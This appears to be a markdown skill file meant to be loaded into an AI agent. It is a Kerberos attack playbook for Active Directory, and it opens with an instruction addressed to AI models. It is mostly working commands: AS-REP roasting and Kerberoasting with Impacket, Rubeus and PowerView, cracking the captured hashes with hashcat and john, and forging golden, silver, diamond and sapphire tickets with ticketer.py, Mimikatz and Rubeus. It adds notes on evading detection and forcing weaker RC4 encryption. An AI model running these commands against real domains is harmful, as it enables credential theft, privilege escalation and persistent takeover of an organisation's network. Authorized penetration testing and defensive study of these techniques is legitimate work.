For other original section numbers, use the [entry index](../SKILL.md#references).


# SKILL: Kerberos Attack Playbook — Expert AD Attack Guide

> **AI LOAD INSTRUCTION**: Expert Kerberos attack techniques for AD environments. Covers AS-REP roasting, Kerberoasting, golden/silver/diamond/sapphire tickets, delegation attacks, pass-the-ticket, and overpass-the-hash. Base models miss ticket type distinctions, delegation chain nuances, and detection-evasion trade-offs.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-acl-abuse](../../active-directory-acl-abuse/SKILL.md) for ACL-based AD attacks often chained with Kerberos
- [active-directory-certificate-services](../../active-directory-certificate-services/SKILL.md) for ADCS-based persistence (golden certificate)
- [ntlm-relay-coercion](../../ntlm-relay-coercion/SKILL.md) for NTLM relay attacks that complement Kerberos abuse
- [windows-lateral-movement](../../windows-lateral-movement/SKILL.md) after obtaining tickets for lateral movement

### Advanced Reference

Also load [KERBEROS_ATTACK_CHAINS.md](../KERBEROS_ATTACK_CHAINS.md) when you need:
- Multi-step attack chains combining Kerberos with ACL abuse, ADCS, and relay
- End-to-end scenarios from foothold to domain admin
- Chained delegation attack flows

---

## 1. KERBEROS AUTHENTICATION PRIMER

```
Client              KDC (DC)              Service
  │                   │                     │
  │── AS-REQ ────────→│                     │  (1) Request TGT with user creds
  │←─ AS-REP ─────────│                     │  (2) Receive TGT (encrypted with krbtgt hash)
  │                   │                     │
  │── TGS-REQ ───────→│                     │  (3) Present TGT, request service ticket
  │←─ TGS-REP ────────│                     │  (4) Receive TGS (encrypted with service hash)
  │                   │                     │
  │── AP-REQ ─────────────────────────────→│  (5) Present TGS to service
  │←─ AP-REP ──────────────────────────────│  (6) Mutual auth (optional)
```

---

## 2. AS-REP ROASTING

Users with "Do not require Kerberos preauthentication" can be queried for AS-REP without knowing their password.

### Enumerate Vulnerable Users

```bash
# Impacket — from Linux
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# Impacket — with domain creds (enumerate automatically)
GetNPUsers.py DOMAIN/user:password -dc-ip DC_IP -request

# Rubeus — from Windows (domain-joined)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# PowerView — enumerate users
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```

### Crack AS-REP Hash

```bash
# Hashcat mode 18200
hashcat -m 18200 asrep.txt rockyou.txt --rules-file best64.rule

# John
john asrep.txt --wordlist=rockyou.txt
```

---

## 3. KERBEROASTING

Any domain user can request TGS for accounts with SPNs. The TGS is encrypted with the service account's NTLM hash.

### Request Service Tickets

```bash
# Impacket
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile tgs.txt

# Rubeus (from Windows)
Rubeus.exe kerberoast /outfile:tgs.txt

# Rubeus — target specific SPN / high-value accounts
Rubeus.exe kerberoast /user:svc_sql /outfile:tgs_sql.txt

# PowerView + manual request
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db.domain.com"
```

### Crack TGS Hash

```bash
# Hashcat mode 13100 (RC4) or 19700 (AES)
hashcat -m 13100 tgs.txt rockyou.txt --rules-file best64.rule

# RC4 tickets crack much faster than AES256 — target RC4 if possible
# Rubeus: /tgtdeleg forces RC4 on some configs
Rubeus.exe kerberoast /tgtdeleg
```

---

## 4. TICKET FORGING — GOLDEN, SILVER, DIAMOND, SAPPHIRE

### Golden Ticket

Forge TGT using the `krbtgt` hash → impersonate any user, including non-existent ones.

```bash
# Impacket — forge golden ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM administrator

# Mimikatz
kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# Rubeus
Rubeus.exe golden /rc4:KRBTGT_HASH /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /ptt
```

**Prerequisites**: krbtgt NTLM hash (from DCSync or NTDS.dit)
**Persistence**: Valid until krbtgt password is changed **twice**

### Silver Ticket

Forge TGS using the service account's hash → access specific service only, no KDC interaction.

```bash
# Impacket — forge silver ticket for CIFS (file share)
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM -spn cifs/target.domain.com administrator

# Mimikatz
kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /target:target.domain.com /service:cifs /rc4:SERVICE_HASH /ptt
```

| Target Service | SPN Format | Use Case |
|---|---|---|
| File shares | `cifs/host` | Access SMB shares |
| WinRM | `http/host` | Remote PowerShell |
| LDAP | `ldap/dc` | DCSync-like queries |
| MSSQL | `MSSQLSvc/host:1433` | Database access |
| Exchange | `http/mail.domain.com` | Mailbox access |

### Diamond Ticket

Modify a legitimately issued TGT → harder to detect than golden ticket.

```bash
# Rubeus — request real TGT then modify PAC
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:administrator /domain:DOMAIN.COM /dc:DC01.DOMAIN.COM /ticketuser:targetadmin /ticketuserid:500 /groups:512 /ptt
```

**Advantage**: The ticket's metadata (timestamps, enc type) matches a real TGT issuance.

### Sapphire Ticket

Uses S4U2Self to get a real PAC for the target user, then embeds it in a forged ticket.

```bash
# Rubeus
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /ticketuser:administrator /ticketuserid:500 /groups:512 /tgtdeleg /ptt
```

**Advantage**: PAC is a genuine copy from KDC, making detection extremely difficult.

---

